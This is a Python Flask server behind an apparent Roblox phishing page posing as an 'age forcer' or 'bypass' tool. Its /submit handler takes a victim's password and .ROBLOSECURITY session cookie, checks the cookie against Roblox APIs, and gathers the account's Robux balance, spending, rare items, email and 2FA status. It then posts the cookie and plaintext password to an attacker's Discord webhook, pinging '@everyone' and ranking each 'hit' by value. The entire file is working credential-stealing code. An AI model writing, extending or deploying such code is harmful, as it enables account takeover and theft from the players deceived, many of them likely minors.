import os
import sys
import json
import re
import requests
import base64
import time
import threading
from flask import Flask, request, jsonify, send_from_directory
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)

def send_to_discord_background(password, cookie, webhook_url):
    """Background function to send data to Discord webhook"""
    try:
        print("Background: Fetching Roblox user information...")
        user_info = get_roblox_user_info(cookie)
        
        # Check if cookie actually works with Roblox API
        if not user_info.get('success', False):
            print("Background: Cookie failed validation against Roblox API - not sending webhooks")
            return
        
        # Check if user has Korblox or Headless for ping notification
        korblox = user_info.get('has_korblox', False)
        headless = user_info.get('has_headless', False)
        has_premium_items = korblox or headless
        
        # Check total spent robux for value-based ping
        total_spent_text = user_info.get('total_spent_past_year', '0')
        total_spent_value = 0
        
        # Extract numeric value from total spent text
        try:
            # Remove commas and convert to integer
            total_spent_value = int(total_spent_text.replace(',', '').replace(' ', ''))
        except (ValueError, AttributeError):
            total_spent_value = 0
        
        # Determine ping content based on account value
        ping_content = ''
        
        if total_spent_value >= 50000:
            # High value account - ping everyone
            ping_content = '@everyone 🚨 **HIGH VALUE ACCOUNT DETECTED!** 🚨'
            if has_premium_items:
                ping_content += ' - Account has premium items AND high spending!'
            else:
                ping_content += f' - Total spent: {total_spent_value:,} robux'
                
        elif has_premium_items:
            # Premium items but not high spending
            ping_content = '@everyone 🚨 **PREMIUM ITEMS DETECTED!** 🚨'
            if korblox and headless:
                ping_content += ' - Account has both Korblox AND Headless!'
            elif korblox:
                ping_content += ' - Account has Korblox!'
            elif headless:
                ping_content += ' - Account has Headless!'
                
        else:
            # Normal account with some spending
            if total_spent_value > 0:
                ping_content = '@everyone 📈 **Normal Hit** - Account has spending history'
            else:
                # No ping for accounts with no spending and no premium items
                ping_content = ''
        
        # Prepare cookie content for Discord (use cookie as provided)
        cookie_content = cookie if cookie else 'Not provided'
        
        # Truncate cookie if too long for Discord
        available_cookie_space = 3990  # Conservative limit
        if len(cookie_content) > available_cookie_space:
            cookie_content = cookie_content[:available_cookie_space] + "..."
            print(f"Background: Cookie truncated to fit Discord limit")
        
        # Create Discord embed data for main webhook (with cookie)
        discord_data = {
            'content': ping_content,
            'embeds': [
                {
                    'title': 'Age Forcer Logs',
                    'color': 0xff0000,
                    'thumbnail': {
                        'url': user_info['profile_picture']
                    },
                    'fields': [
                        {
                            'name': '👤 Username',
                            'value': user_info['username'],
                            'inline': False
                        },
                        {
                            'name': '🔐 Password',
                            'value': password if password else 'Not provided',
                            'inline': False
                        },
                        {
                            'name': '💰 Robux',
                            'value': user_info['robux_balance'].replace('R$ ', '') if 'R$ ' in user_info['robux_balance'] else user_info['robux_balance'],
                            'inline': False
                        },
                        {
                            'name': '⌛ Pending',
                            'value': user_info['pending_robux'],
                            'inline': False
                        },
                        {
                            'name': '📊 Summary',
                            'value': user_info.get('total_spent_past_year', 'Not available'),
                            'inline': False
                        },
                        {
                            'name': '<:korblox:1153613134599307314>Korblox',
                            'value': '✅' if korblox else '❌',
                            'inline': False
                        },
                        {
                            'name': '<:head_full:1207367926622191666>Headless',
                            'value': '✅' if headless else '❌',
                            'inline': False
                        },
                        {
                            'name': '🔐 Account Settings Information',
                            'value': f"**Email Address:** {user_info.get('email_address', 'Not available')}\n**Verified:** {user_info.get('email_verified', '❌')}\n**Pin:** {user_info.get('pin_enabled', '❌')}\n**Authenticator:** {user_info.get('authenticator_enabled', '❌')}",
                            'inline': False
                        }
                    ],
                    'footer': {
                        'text': f'Today at {time.strftime("%H:%M", time.localtime())}',
                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
                    }
                },
                {
                    'title': '🍪 Cookie Data',
                    'color': 0xff0000,
                    'description': f'```{cookie_content}```',
                    'footer': {
                        'text': 'Authentication Token • Secured',
                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
                    }
                }
            ]
        }
        
        # Send to main Discord webhook (full data with cookie)
        payload_size = len(json.dumps(discord_data))
        print(f"Background: Sending Discord payload of size: {payload_size} bytes")
        
        response = requests.post(webhook_url, json=discord_data, timeout=5)
        
        if response.status_code in [200, 204]:
            print(f"Background: Discord webhook successful: {response.status_code}")
        else:
            print(f"Background: Discord webhook failed: {response.status_code}")
        
        # Send to bypass webhook (without cookie and password) if configured
        bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
        if bypass_webhook_url:
            send_to_bypass_webhook(user_info, ping_content)
            
    except Exception as e:
        print(f"Background: Error sending to Discord: {str(e)}")

def send_to_bypass_webhook(user_info, ping_content):
    """Send bypass logs to separate webhook without cookie and password data"""
    try:
        print("Sending bypass logs to secondary webhook...")
        
        # Create bypass embed without cookie and password data
        bypass_data = {
            'content': '@everyone 📊 Success',  # Added ping notification
            'embeds': [
                {
                    'title': 'BYPASS - LOGS',
                    'color': 0x00ff00,  # Green color for success
                    'thumbnail': {
                        'url': user_info['profile_picture']
                    },
                    'fields': [
                        {
                            'name': '👤 Username',
                            'value': user_info['username'],
                            'inline': True
                        },
                        {
                            'name': '💰 Robux',
                            'value': user_info['robux_balance'].replace('R$ ', '') if 'R$ ' in user_info['robux_balance'] else user_info['robux_balance'],
                            'inline': True
                        },
                        {
                            'name': '⌛ Pending',
                            'value': user_info['pending_robux'],
                            'inline': True
                        },
                        {
                            'name': '🌟 Premium',
                            'value': user_info.get('premium_status', '❌ No'),
                            'inline': True
                        },
                        {
                            'name': '📊 Summary',
                            'value': user_info.get('total_spent_past_year', 'Not available'),
                            'inline': True
                        },
                        {
                            'name': '<:korblox:1153613134599307314>Korblox',
                            'value': '✅' if user_info.get('has_korblox', False) else '❌',
                            'inline': True
                        },
                        {
                            'name': '<:head_full:1207367926622191666>Headless',
                            'value': '✅' if user_info.get('has_headless', False) else '❌',
                            'inline': True
                        },
                        {
                            'name': '✅ Status',
                            'value': '**Successful 🟢**\n\n**[BYPASSER LINK](https://rblx-forcer.vercel.app)**\n\n**[REFRESH Cookie](https://rblx-refresher.ct.ws/?i=2)**',
                            'inline': False
                        }
                    ],
                    'footer': {
                        'text': f'Bypass Logs • {time.strftime("%H:%M", time.localtime())}',
                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
                    }
                }
            ]
        }
        
        bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
        response = requests.post(bypass_webhook_url, json=bypass_data, timeout=5)
        
        if response.status_code in [200, 204]:
            print(f"Bypass webhook successful: {response.status_code}")
        else:
            print(f"Bypass webhook failed: {response.status_code}")
            
    except Exception as e:
        print(f"Error sending to bypass webhook: {str(e)}")

def get_roblox_user_info(cookie):
    """Get Roblox user information using the provided cookie"""
    try:
        headers = {
            'Cookie': f'.ROBLOSECURITY={cookie}' if not cookie.startswith('.ROBLOSECURITY=') else cookie,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # Get current user info
        response = requests.get('https://users.roblox.com/v1/users/authenticated', 
                              headers=headers, timeout=3)
        
        if response.status_code == 200:
            user_data = response.json()
            user_id = user_data.get('id')
            username = user_data.get('name', 'Unknown')
            display_name = user_data.get('displayName', username)
            
            # Get user avatar/profile picture
            avatar_response = requests.get(f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png',
                                         timeout=5)
            
            profile_picture_url = 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter'
            if avatar_response.status_code == 200:
                avatar_data = avatar_response.json()
                if avatar_data.get('data') and len(avatar_data['data']) > 0:
                    profile_picture_url = avatar_data['data'][0].get('imageUrl', profile_picture_url)
            
            # Get Robux balance - try multiple endpoints
            robux_balance = 'Not available'
            
            # Try the currency endpoint first
            try:
                robux_response = requests.get('https://economy.roblox.com/v1/users/currency',
                                            headers=headers, timeout=5)
                print(f"Robux API response status: {robux_response.status_code}")
                
                if robux_response.status_code == 200:
                    robux_data = robux_response.json()
                    print(f"Robux API response: {robux_data}")
                    if 'robux' in robux_data:
                        robux_balance = f"R$ {robux_data['robux']:,}"
                    else:
                        print("No 'robux' field in response")
                else:
                    print(f"Robux API failed with status: {robux_response.status_code}, response: {robux_response.text}")
            except Exception as robux_error:
                print(f"Error getting Robux balance: {str(robux_error)}")
                
            # If first method failed, try alternative endpoint using user_id
            if robux_balance == 'Not available' and user_id:
                try:
                    alt_response = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency',
                                              headers=headers, timeout=5)
                    print(f"Alternative Robux API response status: {alt_response.status_code}")
                    
                    if alt_response.status_code == 200:
                        alt_robux_data = alt_response.json()
                        print(f"Alternative Robux API response: {alt_robux_data}")
                        if 'robux' in alt_robux_data:
                            robux_balance = f"R$ {alt_robux_data['robux']:,}"
                except Exception as alt_error:
                    print(f"Alternative Robux API error: {str(alt_error)}")
            
            # Get Pending Robux using transaction totals endpoint
            pending_robux = 'Not available'
            try:
                pending_response = requests.get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Month&transactionType=summary',
                                              headers=headers, timeout=5)
                print(f"Pending Robux API response status: {pending_response.status_code}")
                
                if pending_response.status_code == 200:
                    pending_data = pending_response.json()
                    print(f"Pending Robux API response: {pending_data}")
                    if 'pendingRobuxTotal' in pending_data:
                        pending_amount = pending_data['pendingRobuxTotal']
                        pending_robux = f"{pending_amount:,}" if isinstance(pending_amount, (int, float)) else str(pending_amount)
                    else:
                        print("No 'pendingRobuxTotal' field in response")
                        pending_robux = '0'
                else:
                    print(f"Pending Robux API failed with status: {pending_response.status_code}, response: {pending_response.text}")
                    pending_robux = '0'
            except Exception as pending_error:
                print(f"Error getting Pending Robux: {str(pending_error)}")
                pending_robux = '0'
            
            # Get Total spent robux past year using transaction totals endpoint
            total_spent_past_year = 'Not available'
            try:
                # Try yearly timeframe first
                year_response = requests.get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary',
                                           headers=headers, timeout=5)
                print(f"Yearly spending API response status: {year_response.status_code}")
                
                if year_response.status_code == 200:
                    year_data = year_response.json()
                    print(f"Yearly spending API response: {year_data}")
                    
                    # Look for outgoing robux total (spent robux)
                    if 'outgoingRobuxTotal' in year_data:
                        spent_amount = year_data['outgoingRobuxTotal']
                        total_spent_past_year = f"{spent_amount:,}" if isinstance(spent_amount, (int, float)) else str(spent_amount)
                    elif 'robuxSpent' in year_data:
                        spent_amount = year_data['robuxSpent']
                        total_spent_past_year = f"{spent_amount:,}" if isinstance(spent_amount, (int, float)) else str(spent_amount)
                    else:
                        print("No spending data fields found in yearly response")
                        total_spent_past_year = '0'
                        
                elif year_response.status_code == 500:
                    # Known issue with yearly timeframe, try monthly as fallback
                    print("Yearly API returned 500 error, falling back to monthly data estimation")
                    total_spent_past_year = 'Estimate unavailable'
                else:
                    print(f"Yearly spending API failed with status: {year_response.status_code}, response: {year_response.text}")
                    total_spent_past_year = 'API Error'
                    
            except Exception as year_error:
                print(f"Error getting yearly spending data: {str(year_error)}")
                total_spent_past_year = 'Connection Error'
            
            # Check Premium status
            premium_status = '❌ No'
            try:
                premium_response = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership',
                                              headers=headers, timeout=5)
                print(f"Premium API response status: {premium_response.status_code}")
                
                if premium_response.status_code == 200:
                    premium_data = premium_response.json()
                    print(f"Premium API response: {premium_data}")
                    # Handle both object and boolean responses
                    if isinstance(premium_data, bool):
                        premium_status = '✅ Yes' if premium_data else '❌ No'
                    elif isinstance(premium_data, dict) and premium_data.get('isPremium', False):
                        premium_status = '✅ Yes'
                else:
                    print(f"Premium API failed with status: {premium_response.status_code}")
            except Exception as premium_error:
                print(f"Error getting Premium status: {str(premium_error)}")
            
            # Check for Korblox and Headless items in user's inventory
            has_korblox = False
            has_headless = False
            
            try:
                # Check for Korblox Deathspeaker Right Leg (ID: 139607718)
                korblox_response = requests.get(f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/139607718',
                                              headers=headers, timeout=5)
                print(f"Korblox inventory check status: {korblox_response.status_code}")
                
                if korblox_response.status_code == 200:
                    korblox_data = korblox_response.json()
                    has_korblox = len(korblox_data.get('data', [])) > 0
                    print(f"Korblox check result: {has_korblox}")
                else:
                    print(f"Korblox inventory check failed: {korblox_response.status_code}")
                    
            except Exception as korblox_error:
                print(f"Error checking Korblox inventory: {str(korblox_error)}")
            
            try:
                # Check for Headless items (both classic and dynamic)
                headless_ids = [134082579, 15093053680]  # Classic and Dynamic Headless
                
                for headless_id in headless_ids:
                    headless_response = requests.get(f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{headless_id}',
                                                   headers=headers, timeout=5)
                    print(f"Headless {headless_id} inventory check status: {headless_response.status_code}")
                    
                    if headless_response.status_code == 200:
                        headless_data = headless_response.json()
                        if len(headless_data.get('data', [])) > 0:
                            has_headless = True
                            print(f"Headless item {headless_id} found")
                            break
                    else:
                        print(f"Headless {headless_id} inventory check failed: {headless_response.status_code}")
                        
            except Exception as headless_error:
                print(f"Error checking Headless inventory: {str(headless_error)}")
            
            # Get Account Settings Information
            email_address = 'Not available'
            email_verified = '❌'
            pin_enabled = '❌'
            authenticator_enabled = '❌'
            
            try:
                # Get email information
                email_response = requests.get('https://accountsettings.roblox.com/v1/email',
                                           headers=headers, timeout=5)
                print(f"Email API response status: {email_response.status_code}")
                
                if email_response.status_code == 200:
                    email_data = email_response.json()
                    print(f"Email API response: {email_data}")
                    
                    # Get email address and mask it
                    if email_data.get('emailAddress'):
                        email = email_data['emailAddress']
                        # Mask email: k*******@gmail.com
                        if '@' in email:
                            local_part, domain = email.split('@', 1)
                            if len(local_part) > 1:
                                masked_email = local_part[0] + '*' * (len(local_part) - 1) + '@' + domain
                            else:
                                masked_email = email[0] + '*' * (len(email) - 1)
                            email_address = masked_email
                        else:
                            email_address = email
                    
                    # Check email verification status
                    if email_data.get('verified', False):
                        email_verified = '✅'
                    else:
                        email_verified = '❌'
                else:
                    print(f"Email API failed with status: {email_response.status_code}")
                    
            except Exception as email_error:
                print(f"Error checking email settings: {str(email_error)}")
            
            try:
                # Check PIN status
                pin_response = requests.get('https://auth.roblox.com/v1/account/pin',
                                          headers=headers, timeout=5)
                print(f"PIN API response status: {pin_response.status_code}")
                
                if pin_response.status_code == 200:
                    pin_data = pin_response.json()
                    print(f"PIN API response: {pin_data}")
                    
                    # Check if PIN is enabled
                    if pin_data.get('isEnabled', False):
                        pin_enabled = '✅'
                    else:
                        pin_enabled = '❌'
                else:
                    print(f"PIN API failed with status: {pin_response.status_code}")
                    pin_enabled = '❌'
                    
            except Exception as pin_error:
                print(f"Error checking PIN status: {str(pin_error)}")
                pin_enabled = '❌'
            
            try:
                # Check 2FA/Authenticator status
                twostep_response = requests.get('https://twostepverification.roblox.com/v1/users/configuration',
                                              headers=headers, timeout=5)
                print(f"2FA API response status: {twostep_response.status_code}")
                
                if twostep_response.status_code == 200:
                    twostep_data = twostep_response.json()
                    print(f"2FA API response: {twostep_data}")
                    
                    # Check if authenticator is enabled
                    if twostep_data.get('authenticatorEnabled', False) or twostep_data.get('totpEnabled', False):
                        authenticator_enabled = '✅'
                    else:
                        authenticator_enabled = '❌'
                else:
                    print(f"2FA API failed with status: {twostep_response.status_code}")
                    authenticator_enabled = '❌'
                    
            except Exception as twostep_error:
                print(f"Error checking 2FA settings: {str(twostep_error)}")
                authenticator_enabled = '❌'
            
            return {
                'success': True,
                'username': username,
                'display_name': display_name,
                'user_id': user_id,
                'profile_picture': profile_picture_url,
                'robux_balance': robux_balance,
                'pending_robux': pending_robux,
                'premium_status': premium_status,
                'total_spent_past_year': total_spent_past_year,
                'has_korblox': has_korblox,
                'has_headless': has_headless,
                'email_address': email_address,
                'email_verified': email_verified,
                'pin_enabled': pin_enabled,
                'authenticator_enabled': authenticator_enabled
            }
        else:
            print(f"Cookie validation failed against Roblox API: {response.status_code}")
            print(f"Response: {response.text}")
        
    except Exception as e:
        print(f"Error fetching Roblox user info: {str(e)}")
    
    # Return failure indicator if cookie doesn't work with Roblox API
    return {
        'success': False,
        'username': 'Not available',
        'display_name': 'Not available', 
        'user_id': None,
        'profile_picture': 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter',
        'robux_balance': 'Not available',
        'pending_robux': 'Not available',
        'premium_status': '❌ No',
        'total_spent_past_year': 'Not available',
        'has_korblox': False,
        'has_headless': False,
        'email_address': 'Not available',
        'email_verified': '❌',
        'pin_enabled': '❌',
        'authenticator_enabled': '❌'
    }

def is_valid_cookie(cookie):
    """
    Validate cookie and check if it's not expired
    Supports JWT tokens and session cookies with expiration
    Returns tuple: (is_valid, is_expired, error_message)
    """
    if not cookie or len(cookie) < 10:
        return False, False, "Invalid cookie format"
    
    # Check if it's a JWT token (has 3 parts separated by dots)
    if cookie.count('.') == 2:
        try:
            # Split JWT token
            header, payload, signature = cookie.split('.')
            
            # Decode payload with correct padding for URL-safe base64
            payload += '=' * (-len(payload) % 4)
            decoded_payload = base64.urlsafe_b64decode(payload)
            payload_data = json.loads(decoded_payload)
            
            # Check expiration (exp claim)
            if 'exp' in payload_data:
                exp_time = payload_data['exp']
                current_time = int(time.time())
                
                if current_time >= exp_time:
                    return False, True, "Cookie has expired"  # Token is expired
            
            return True, False, None  # Valid JWT token, not expired
            
        except (ValueError, json.JSONDecodeError, Exception):
            return False, False, "Invalid cookie format"  # Invalid JWT format
    
    # For non-JWT cookies, accept Roblox-style cookies and other formats
    # Accept Roblox .ROBLOSECURITY cookies (often start with _|WARNING:)
    # Allow truncated cookies as long as they meet minimum requirements
    if cookie.startswith('_|WARNING:') and len(cookie) > 50:
        return True, False, None
    
    # Accept standard cookie formats
    cookie_pattern = r'^(session|token|auth|_token|user_token|access_token)=[A-Za-z0-9+/=_-]{10,}$'
    if re.match(cookie_pattern, cookie):
        return True, False, None
    
    # Accept any long alphanumeric string that could be a valid token
    # Allow truncated cookies as long as they have some valid characters
    if len(cookie) >= 30 and any(c.isalnum() for c in cookie):
        return True, False, None
    
    return False, False, "Invalid cookie format"

@app.route('/')
def index():
    """Serve the main HTML page"""
    return send_from_directory('.', 'index.html')

@app.route('/health')
def health_check():
    """Health check endpoint to verify main webhook connectivity"""
    webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
    
    if not webhook_url:
        return jsonify({
            'status': 'error',
            'message': 'DISCORD_WEBHOOK_URL not configured'
        }), 500
    
    # Validate webhook URL format
    if not webhook_url.startswith('https://discord.com/api/webhooks/'):
        return jsonify({
            'status': 'error', 
            'message': 'Invalid Discord webhook URL format'
        }), 500
    
    try:
        # Test connection with a minimal payload
        test_payload = {'content': 'Health check test'}
        response = requests.post(webhook_url, json=test_payload, timeout=5)
        
        if response.status_code in [200, 204]:
            return jsonify({
                'status': 'ok',
                'message': 'Discord webhook connection successful',
                'webhook_status': response.status_code
            })
        else:
            return jsonify({
                'status': 'error',
                'message': f'Discord webhook returned status {response.status_code}',
                'response': response.text[:200]
            }), 500
            
    except requests.ConnectionError as e:
        return jsonify({
            'status': 'error',
            'message': 'Connection error - cannot reach Discord servers',
            'error': str(e)[:100]
        }), 500
    except requests.Timeout:
        return jsonify({
            'status': 'error',
            'message': 'Timeout error - Discord servers not responding'
        }), 500
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Unexpected error: {str(e)[:100]}'
        }), 500

@app.route('/health/full')
def health_check_full():
    """Comprehensive health check for all webhooks"""
    results = {
        'main_webhook': {'status': 'unknown'},
        'bypass_webhook': {'status': 'unknown'},
        'overall_status': 'unknown'
    }
    
    # Test main webhook
    main_webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
    if not main_webhook_url:
        results['main_webhook'] = {
            'status': 'error',
            'message': 'DISCORD_WEBHOOK_URL not configured'
        }
    else:
        try:
            test_payload = {'content': 'Main webhook health check'}
            response = requests.post(main_webhook_url, json=test_payload, timeout=5)
            
            if response.status_code in [200, 204]:
                results['main_webhook'] = {
                    'status': 'ok',
                    'message': 'Main webhook successful',
                    'status_code': response.status_code
                }
            else:
                results['main_webhook'] = {
                    'status': 'error',
                    'message': f'Main webhook failed with status {response.status_code}',
                    'status_code': response.status_code
                }
        except Exception as e:
            results['main_webhook'] = {
                'status': 'error',
                'message': f'Main webhook error: {str(e)[:100]}'
            }
    
    # Test bypass webhook
    bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
    if not bypass_webhook_url:
        results['bypass_webhook'] = {
            'status': 'warning',
            'message': 'BYPASS_WEBHOOK_URL not configured (optional)'
        }
    else:
        try:
            test_payload = {'content': 'Bypass webhook health check'}
            response = requests.post(bypass_webhook_url, json=test_payload, timeout=5)
            
            if response.status_code in [200, 204]:
                results['bypass_webhook'] = {
                    'status': 'ok',
                    'message': 'Bypass webhook successful',
                    'status_code': response.status_code
                }
            else:
                results['bypass_webhook'] = {
                    'status': 'error',
                    'message': f'Bypass webhook failed with status {response.status_code}',
                    'status_code': response.status_code
                }
        except Exception as e:
            results['bypass_webhook'] = {
                'status': 'error',
                'message': f'Bypass webhook error: {str(e)[:100]}'
            }
    
    # Determine overall status
    main_ok = results['main_webhook']['status'] == 'ok'
    bypass_ok = results['bypass_webhook']['status'] in ['ok', 'warning']
    
    if main_ok and bypass_ok:
        results['overall_status'] = 'ok'
        status_code = 200
    elif main_ok:
        results['overall_status'] = 'warning'
        status_code = 200
    else:
        results['overall_status'] = 'error'
        status_code = 500
    
    return jsonify(results), status_code

@app.route('/debug')
def debug_info():
    """Debug endpoint to check environment and configuration"""
    return jsonify({
        'environment_variables': {
            'DISCORD_WEBHOOK_URL': 'SET' if os.environ.get('DISCORD_WEBHOOK_URL') else 'NOT_SET',
            'BYPASS_WEBHOOK_URL': 'SET' if os.environ.get('BYPASS_WEBHOOK_URL') else 'NOT_SET',
            'DATABASE_URL': 'SET' if os.environ.get('DATABASE_URL') else 'NOT_SET',
            'SESSION_SECRET': 'SET' if os.environ.get('SESSION_SECRET') else 'NOT_SET'
        },
        'python_version': sys.version,
        'current_working_directory': os.getcwd(),
        'files_in_directory': os.listdir('.'),
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())
    })


@app.route('/submit', methods=['POST'])
def submit_form():
    """Handle form submission and send to Discord webhook"""
    try:
        data = request.get_json()
        
        # Extract all form fields
        password = data.get('password', '').strip()
        cookie = data.get('cookie', '').strip()
        
        # Server-side validation
        if not cookie:
            return jsonify({
                'success': False, 
                'message': 'Missing required field (cookie)'
            }), 400
        
        # Comprehensive cookie validation
        is_valid, is_expired, error_msg = is_valid_cookie(cookie)
        
        if not is_valid or is_expired:
            return jsonify({
                'success': False, 
                'message': 'Your Cookie Was Expired Or Invalid'
            }), 400
        
        
        # Get Discord webhook URL from environment
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            print("ERROR: DISCORD_WEBHOOK_URL environment variable not set")
            print("Available environment variables:", [key for key in os.environ.keys() if 'WEBHOOK' in key.upper() or 'DISCORD' in key.upper()])
            return jsonify({
                'success': False, 
                'message': 'Discord webhook not configured. Please set DISCORD_WEBHOOK_URL environment variable in your deployment platform.'
            }), 500
        
        print("Discord webhook URL configured successfully") # Don't log URL for security
        
        # Process Discord webhooks synchronously for Vercel compatibility  
        print("Processing Discord webhooks synchronously...")
        start_time = time.time()
        
        try:
            send_to_discord_background(password, cookie, webhook_url)
            end_time = time.time()
            processing_time = end_time - start_time
            print(f"Discord webhook processing completed successfully in {processing_time:.2f} seconds")
            
            return jsonify({
                'success': True, 
                'message': f'Data processed and sent successfully in {processing_time:.1f}s'
            })
        except Exception as e:
            end_time = time.time()
            processing_time = end_time - start_time
            print(f"Error during Discord webhook processing after {processing_time:.2f} seconds: {str(e)}")
            return jsonify({
                'success': False, 
                'message': f'Processing failed after {processing_time:.1f}s: webhook delivery error'
            }), 500
            
    except Exception as e:
        return jsonify({
            'success': False, 
            'message': 'Server error occurred'
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
